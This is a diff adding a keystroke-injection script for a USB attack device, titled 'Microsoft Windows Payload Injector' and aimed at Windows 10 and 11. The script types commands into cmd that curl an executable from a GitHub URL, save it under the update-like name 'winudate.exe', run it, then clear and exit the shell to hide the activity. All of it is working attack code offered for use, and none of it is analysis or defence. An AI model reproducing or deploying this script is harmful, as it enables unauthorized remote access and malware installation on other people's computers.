@@ -1,0 +1,47 @@
+#!/bin/bash
+#
+# Title:            Microsoft Windows Payload Injector
+#
+# Description:      
+#                   1) Downloads Payload from Specified URI (Enter in Variable Below)
+#                   2) Runs Payload on System
+#
+# Author:           5ly
+# Version:          1.0
+# Category:         Remote Access
+# Target:           Microsoft Windows 10 & 11
+
+LED SETUP
+ATTACKMODE HID
+#Variables
+readonly PAYLOAD_DOWNLOAD_URI="https://raw.githubusercontent.com/SlyJose/whatdoyoumeanthisispii/main/bb.exe"
+
+# Downloads Payload
+LED STAGE1
+Q DELAY 5000
+Q GUI r
+Q STRING "cmd"
+Q ENTER
+Q DELAY 3000
+Q STRING "cd %USERPROFILE%/Downloads"
+Q ENTER
+Q DELAY 1500
+Q STRING "curl ${PAYLOAD_DOWNLOAD_URI} --output winudate.exe"
+Q ENTER
+Q DELAY 300
+
+#Launches the Payload on the machine
+LED STAGE2
+Q STRING winudate.exe
+Q ENTER
+Q DELAY 250
+
+#Clears the shell and exits out.
+LED CLEANUP
+Q STRING clear
+Q ENTER
+Q DELAY 250
+Q STRING exit
+Q ENTER
+
+LED FINISH
